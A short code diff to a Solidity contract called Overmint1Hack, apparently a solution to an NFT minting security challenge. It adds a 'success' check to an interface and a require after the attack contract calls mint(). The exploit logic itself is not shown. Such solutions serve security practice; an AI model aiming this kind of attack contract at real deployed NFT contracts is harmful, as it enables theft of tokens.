@@ -5,6 +5,8 @@ import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
 interface IMint is IERC721 {
     function mint() external;
+
+    function success(address _attacker) external view returns (bool);
 }
 
 contract Overmint1Hack {
@@ -16,6 +18,7 @@ contract Overmint1Hack {
 
     function hackMint() external {
         nftContract.mint();
+        require(nftContract.success(address(this)), "No success");
     }
 
     /**
